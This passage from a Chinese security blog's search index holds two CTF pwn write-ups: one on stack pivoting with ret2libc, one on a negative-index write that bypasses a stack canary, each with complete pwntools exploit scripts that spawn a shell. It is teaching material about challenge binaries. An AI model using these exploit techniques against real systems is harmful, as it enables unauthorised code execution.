rbp</code>已经被设置为我们想让它去的地方(通常是一个可读可写的地址段)，rip又一次执行read，最后在那个段空间重新分配一个新的栈帧，供我们自由发挥</p><p>这里有一些前置知识需要理解，当时困扰了我许久，现在写下来，首先是<code>leave; ret;</code>干了什么，你可以将其理解为两个阶段，先是leave，其相当于<code>mov rsp,rbp</code>和<code>pop rbp</code>，注意，最后，<code>rsp += 8</code>，然后执行<code>ret</code>指令，相当于<code>rip = *rsp</code>，注意，同样，<code>rsp += 8</code>，接下来，如何理解栈帧?其实cpu并不在乎rbp在哪里，它只关心执行流要干什么事儿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">LEA RAX =&gt; local_58,[RBP + -0x50]<br></code></pre></td></tr></table></figure><p>read始于local_58[80]的地址，local_58[80]这个数组始终位于<code>rbp - 0x50</code>的位置，而<code>rbp + 0x8</code>的位置便是<code>rip</code>，栈帧布局永远如此，无论rbp在哪里，因此给了我们伪造新栈帧的利用空间</p><p>所以第一段payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)  <span class="hljs-comment">#相当于重新执行一次read</span><br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>这时一个新的栈帧在bss段中形成了</p><p>我们在新的栈帧中有了充足的空间来写rop链，因此便十分<em>easy</em>了，就打一个ret2libc吧，先来泄露libc基址</p><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>第一次看这个payload应该还是蛮懵的，不过对照着<code>leave; ret;</code>的含义在内存布局中多自己分析推导几遍便能理解其妙处所在，这里便不展开了</p><p>大致画一下内存布局供你分析</p><p><img src="/images/4.png" alt="内存布局"></p><p>接下来接收得到的puts真实地址并计算libc基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br></code></pre></td></tr></table></figure><p>注意上述payload执行完后我们又回到了main函数，此时rsp经过一系列弹栈，应该位于<code>0x404810</code>的位置，而main函数起始处的指令再次布置了栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push rbp<br>mov rbp,rsp<br>sub rsp,0x50<br></code></pre></td></tr></table></figure><p>这段理解起来确实比较复杂，还是那句话，多动手调试(善用你的gdb)，思考，分析<em>汇编</em>，<strong>rsp</strong>，<strong>rbp</strong>，<strong>rip</strong>，<em>内存</em>等的变化</p><p>此时在新的栈帧上，类似于上面，我们布置我们的最终payload</p><p>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)  <span class="hljs-comment">#对齐!</span><br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>最后也是成功拿到shell</p><p>如果你彻底理解了这道题目，并能完整推理一遍过程，恭喜你，大抵是彻底理解了<code>stack pivot</code>这门技术，接下来迎接你的即将是更为复杂的栈布局，你加油，我也加油…</p><p>最后补一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf =ELF(<span class="hljs-string">&quot;./pivot&quot;</span>,<span class="hljs-literal">False</span>) <span class="hljs-comment">#本地...</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,<span class="hljs-literal">False</span>)<br>context.binary = elf<br>sh = elf.process()<br><br>pop_rdi_ret = <span class="hljs-number">0x401225</span><br>leave_ret = <span class="hljs-number">0x40121b</span><br>ret = leave_ret + <span class="hljs-number">1</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br><br>payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)<br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>感谢阅读…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈迁移</tag>
      
      <tag>ret2libc</tag>
      
      <tag>内存布局</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>a_strange_rop</title>
    <link href="/2025/12/25/a-strange-rop/"/>
    <url>/2025/12/25/a-strange-rop/</url>
    
    <content type="html"><![CDATA[<p>题目来自2025XSWCTF决赛的pwn题: <code>a_atrange_rop</code></p><p>题目为64为动态链接elf文件</p><p>保护为<code>NX</code>和<code>canary</code></p><p>既然题目叫a_stranre_rop</p><p>我们先看看有没有gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./a_strange_rop | grep <span class="hljs-string">&quot;pop rdi&quot;</span><br></code></pre></td></tr></table></figure><p>找到了<code>pop rdi; ret;</code>这样的一个gadget</p><p>先观察一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  init(param_1);<br>  iVar1 = game();<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;<br>    win();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>init为初始化函数，无实际意义，忽略</p><p>我们先来看一下win函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  system(<span class="hljs-string">&quot;ababalabalabalawuwuwuuwyyyyy&quot;</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到即使调用了win也不会真的<code>win</code>，但是它为我们提供了<code>call system</code>这样一个系统调用的函数</p><p>配合我们的上面找到的gadget</p><p>似乎很容易就能写出system(“&#x2F;bin&#x2F;sh”)</p><p>来看看主逻辑game部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">time_t</span> tVar3;<br>  undefined8 uVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">int</span> local_78;<br>  uint local_74;<br>  <span class="hljs-type">long</span> local_68 [<span class="hljs-number">11</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  id = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0040202b);<br>  tVar3 = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);<br>  srand((uint)tVar3);<br>  <span class="hljs-keyword">for</span> (local_78 = <span class="hljs-number">0</span>; local_78 &lt; <span class="hljs-number">10</span>; local_78 = local_78 + <span class="hljs-number">1</span>) &#123;<br>    iVar1 = FUN_00401160();<br>    iVar2 = FUN_00401160();<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402041,(ulong)id,(ulong)(uint)(iVar1 % <span class="hljs-number">0x14</span>),(ulong)(uint)(iVar2 % <span class="hljs-number">0x14</span>));<br>    (&amp;answer)[(<span class="hljs-type">int</span>)id] = (<span class="hljs-type">long</span>)(iVar2 % <span class="hljs-number">0x14</span> + iVar1 % <span class="hljs-number">0x14</span>);<br>    id = id + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00402058);<br>  <span class="hljs-keyword">for</span> (; t &lt; <span class="hljs-number">0xb</span>; t = t + <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402077);<br>    __isoc99_scanf(&amp;DAT_00402085,&amp;id);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)id) &#123;<br>      <span class="hljs-built_in">puts</span>(&amp;DAT_00402088);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x1bf52</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_004020a8);<br>    __isoc99_scanf(&amp;DAT_004020b0,local_68 + (<span class="hljs-type">int</span>)id);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_004020b8);<br>  local_74 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)local_74) &#123;<br>      uVar4 = <span class="hljs-number">1</span>;<br>LAB_00401548:<br>      <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-keyword">return</span> uVar4;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((&amp;answer)[(<span class="hljs-type">int</span>)local_74] != local_68[(<span class="hljs-type">int</span>)local_74]) &#123;<br>      <span class="hljs-built_in">printf</span>(&amp;DAT_004020d8,(ulong)local_74);<br>      uVar4 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LAB_00401548;<br>    &#125;<br>    local_74 = local_74 + <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>运行起来是这么个样子</p><p><img src="/images/1.png" alt="交互"></p><p>略微有点长，但是并不难理解，local_10为随机生成的canary值，因此不能直接溢出覆盖返回地址，否则会触发canary检测程序直接退出</p><p>题目要求回答一些小学数学题目，全部回答正确就跳转到win函数，但是我们已经看到win函数并没有实际作用，因此思路依旧是覆盖返回地址为我们构造的rop链</p><p>先来分析一下栈布局</p><p>定义了一个数组local_68[11]</p><p>可以分析得出</p><p><img src="/images/2.png" alt="栈布局大致如此"></p><p>题目设置了一个小check机制，明明有0到9十道题目，但是数组设置了0到10十一个题目编号，而输入的题目编号大于9的时候程序自动退出，并大声斥责我们<em>你想干什么!</em></p><p>我的第一个思路是设置题目编号为8，即local_68[9]所在的位置，向上填充至覆盖rip，执行rop链</p><p>但是这个canary是我永远越不过的坎…</p><p>思来想去，我突然注意到，题目编号大于9时会自动退出，<strong>但是</strong>题目却不检查负数编号!</p><p>因此我们可以将题目设置为负数通过负索引去写前面的地址!</p><p>用gdb看一看怎么个事儿</p><p>我在第一次输入后打上了断点，输入编号<code>-1</code>并输入答案<code>666</code>，local_68在rbp下0x60的位置，我们看看更下面的情况</p><p><img src="/images/3.png" alt="地址情况"></p><p>可以看到，正如我们分析的那般，<code>-1</code>索引写的<code>666</code>代表的<code>00029a</code>写在了local_68下方的地址，再认真一看，前方的<code>0x004014bc</code>不正是另一个函数的返回地址吗!</p><p>我们只需要将索引设置为-3便可以覆盖另一个函数的返回地址来执行我们的rop链</p><p>这个函数用canary将我们拦住，十分安全，可是，另一个函数却已经悄然被我们所攻克…</p><p>题目也是十分贴心，<code>/bin/sh</code>字符串都帮我们准备好了</p><p>接下来便很简单了</p><p>exp也是十分优雅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>bin_sh = <span class="hljs-built_in">str</span>(<span class="hljs-number">4210808</span>)   <span class="hljs-comment"># 0x404078</span><br>call_system = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199136</span>)   <span class="hljs-comment"># 0x4012e0</span><br>pop_rdi_ret = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199153</span>)  <span class="hljs-comment"># 0x4012f1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_pair</span>(<span class="hljs-params">idx, val</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;题目编号:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>\n&quot;</span>.encode())<br>    p.recvuntil(<span class="hljs-string">&#x27;结果:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;val&#125;</span>\n&quot;</span>.encode())<br><br>send_pair(-<span class="hljs-number">2</span>, bin_sh)    <span class="hljs-comment"># 写 /bin/sh</span><br>send_pair(-<span class="hljs-number">1</span>, call_system)   <span class="hljs-comment"># 调用 system</span><br>send_pair(-<span class="hljs-number">3</span>, pop_rdi_ret)  <span class="hljs-comment"># 覆盖另一个函数的rip</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后也是成功地拿到shell</p><p>至此，终于理解题目为什么叫:<code>a_strange_rop</code>!</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内存布局</tag>
      
      <tag>gdb</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
